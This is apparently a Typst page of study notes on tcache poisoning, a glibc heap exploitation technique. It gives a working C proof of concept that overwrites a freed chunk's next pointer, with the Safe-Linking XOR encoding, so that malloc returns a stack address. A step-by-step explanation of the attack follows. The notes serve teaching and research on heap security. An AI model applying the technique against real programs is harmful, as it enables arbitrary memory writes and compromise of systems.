#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Tcache Poisoning",
    description: "Tricking malloc into returning an arbitrary pointer by overwriting the next pointer of a freed tcache chunk.",
    date: "2025-12-28",
    order: 10,
  ),
)<frontmatter>

= Tcache Poisoning

== Introduction

Tcache poisoning is a powerful heap exploitation technique that targets the Thread Local Cache (tcache) introduced in glibc 2.26. By overwriting the `next` pointer of a chunk in the tcache freelist, an attacker can trick `malloc` into returning a pointer to an arbitrary memory location, such as the stack, a global variable, or a function hook.

== Prerequisites
- *Heap Leak (glibc 2.32+)*: Since glibc 2.32, pointers in tcache are protected by "Safe-Linking" (XORed with their address). Overwriting them requires knowing the heap address to correctly encode the target pointer.
- *Memory Corruption*: A vulnerability (like a heap overflow or use-after-free) that allows writing to a freed tcache chunk.
- *Proper Alignment*: The target address must be aligned to 16 bytes (on 64-bit systems) to avoid crashes in recent glibc versions.

== Example from `tcache_poisoning.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	size_t stack_var[0x10];
	size_t *target = NULL;

	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}
	assert(target != NULL);

	intptr_t *a = malloc(128);
	intptr_t *b = malloc(128);

	free(a);
	free(b);

	// VULNERABILITY
	b[0] = (intptr_t)((long)target ^ (long)b >> 12);
	// VULNERABILITY

	malloc(128);
	intptr_t *c = malloc(128);

	assert((long)target == (long)c);
	return 0;
}
```

== Attack Flow Explained

The attack proceeds in the following steps:

=== 1. Initial Allocations and Frees
The program allocates two chunks `a` and `b`. When they are freed, they are placed into the tcache bin for their size. Tcache is a LIFO (Last-In First-Out) structure, so the list becomes `HEAD -> b -> a`.

=== 2. Overwriting the Next Pointer
A vulnerability is exploited to overwrite the `next` pointer of chunk `b`. In this example, the address of `target` is XORed with the address of `b` (shifted right by 12 bits) to satisfy the *Safe-Linking* mitigation introduced in glibc 2.32.

```c
b[0] = (intptr_t)((long)target ^ (long)b >> 12);
```

After this overwrite, the tcache list effectively becomes `HEAD -> b -> target`.

=== 3. Arbitrary Allocation
1. The next call to `malloc(128)` returns chunk `b`. The tcache head now points to `target`.
2. The subsequent call to `malloc(128)` returns `target`.

The attacker now has a pointer to an arbitrary memory location and can read from or write to it.

```
